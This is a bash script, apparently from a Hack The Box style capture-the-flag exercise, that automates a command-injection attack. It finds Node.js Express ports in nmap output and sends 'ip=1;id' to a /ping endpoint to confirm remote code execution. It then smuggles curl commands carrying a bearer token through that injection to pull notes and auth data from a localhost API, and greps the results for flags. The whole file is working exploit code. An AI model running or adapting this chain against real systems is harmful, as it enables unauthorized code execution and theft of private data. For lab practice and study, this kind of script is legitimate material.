#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PRIMARY_PORT=${2:?PRIMARY_PORT}
NMAP_FILE=${3:-/workspace/recon/nmap/${IP}_full.nmap}
TO=${4:-8}
OUT_BASE=${5:-/workspace/recon/httpx}
OUT_DIR="$OUT_BASE/${IP}_${PRIMARY_PORT}"
TMP_DIR=/workspace/recon/tmp
mkdir -p "$OUT_DIR" "$TMP_DIR"
TOKEN=$(cat "$OUT_DIR/token.txt" 2>/dev/null || true)
if [[ -z "${TOKEN:-}" ]]; then
  echo "Missing token; login first" >&2
  exit 1
fi
API_LOCAL="http://127.0.0.1:${PRIMARY_PORT}"
# 1) Collect Node.js Express ports from nmap
NODE_PORTS=$(rg -n "Node\\.js Express framework" -S "$NMAP_FILE" | awk -F: '{print $2}' | awk '{print $1}' | cut -d/ -f1 | sort -n | uniq)
if [[ -z "${NODE_PORTS:-}" ]]; then
  NODE_PORTS="$PRIMARY_PORT"
fi
echo "$NODE_PORTS" | tr ' ' '\n' > "$OUT_DIR/node_ports_candidates.txt"
# 2) Probe for RCE /ping on each candidate
: > "$OUT_DIR/rce_hits.txt"
while read -r p; do
  [[ -z "$p" ]] && continue
  BASE="http://$IP:$p"
  # Quick GET /ping
  curl -fsS -m "$TO" --connect-timeout "$TO" -s "$BASE/ping" | head -n 2 > "$OUT_DIR/p${p}_ping_get.txt" || true
  # POST injection test
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$BASE/ping" || true)
  echo "$RES" | head -n 3 > "$OUT_DIR/p${p}_ping_post.txt"
  if echo "$RES" | grep -qiE "uid=|www-data|linux"; then
    echo "$p" | tee -a "$OUT_DIR/rce_hits.txt"
    # 3) Build injection to pivot to primary API localhost
    printf "ip=1;curl -s -H 'Authorization: Bearer %s' %s/api/notes/all" "$TOKEN" "$API_LOCAL" > "$TMP_DIR/inj_all_${p}.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_all_${p}.txt" "$BASE/ping" > "$OUT_DIR/p${p}_notes_all_local.json" || true
    # Also try ?all=1
    printf "ip=1;curl -s -H 'Authorization: Bearer %s' '%s/api/notes?all=1'" "$TOKEN" "$API_LOCAL" > "$TMP_DIR/inj_list_${p}.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_list_${p}.txt" "$BASE/ping" > "$OUT_DIR/p${p}_notes_list_local.json" || true
    # Verify
    printf "ip=1;curl -s -H 'Authorization: Bearer %s' %s/api/auth/verify" "$TOKEN" "$API_LOCAL" > "$TMP_DIR/inj_verify_${p}.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_verify_${p}.txt" "$BASE/ping" > "$OUT_DIR/p${p}_verify_local.json" || true
  fi
done < "$OUT_DIR/node_ports_candidates.txt"
# 4) Search for flag in any pivoted outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" | tee "$OUT_DIR/pivot_hits.txt" || true
sed -n '1,200p' "$OUT_DIR/pivot_hits.txt" || true
